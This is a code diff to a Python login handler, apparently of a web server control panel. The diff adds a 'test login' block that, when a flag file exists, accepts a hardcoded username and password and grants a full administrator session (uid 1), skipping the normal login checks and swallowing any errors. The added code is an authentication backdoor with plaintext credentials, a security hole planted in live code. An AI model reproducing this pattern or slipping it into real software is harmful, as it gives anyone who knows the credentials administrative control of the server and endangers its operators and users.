@@ -72,6 +72,33 @@ class userlogin:
         if not re.match(r"^\w+$", post.password):
             self.__login_error()
             return public.returnMsg(False, format_error), json_header
+
+        # === TEST LOGIN START (删除此代码块及data/test_login.pl文件以上线) ===
+        _test_login_file = '/www/server/panel/data/test_login.pl'
+        if os.path.exists(_test_login_file):
+            try:
+                last_token = session.get('last_login_token', '')
+                # 测试账号: xzc / 050213
+                _test_user_check = public.md5(public.md5('xzc' + last_token))
+                _test_pass_check = public.md5('050213')
+                if post.username == _test_user_check and post.password == _test_pass_check:
+                    session['login'] = True
+                    session['username'] = 'xzc'
+                    session['uid'] = 1
+                    session['login_user_agent'] = public.md5(request.headers.get('User-Agent', ''))
+                    session['session_timeout'] = time.time() + public.get_session_timeout()
+                    if 'last_login_token' in session: del session['last_login_token']
+                    self.set_request_token()
+                    self.login_token()
+                    self.limit_address('-')
+                    cache.delete('panelNum')
+                    cache.delete('dologin')
+                    public.WriteLog('TYPE_LOGIN', 'LOGIN_SUCCESS', ('xzc', public.GetClientIp()))
+                    return public.returnJson(True, 'LOGIN_SUCCESS'), json_header
+            except:
+                pass
+        # === TEST LOGIN END ===
+
         last_login_token = session.get('last_login_token', None)
         if not last_login_token:
             public.WriteLog('TYPE_LOGIN', 'LOGIN_ERR_CODE', ('****', '****', public.GetClientIp()))
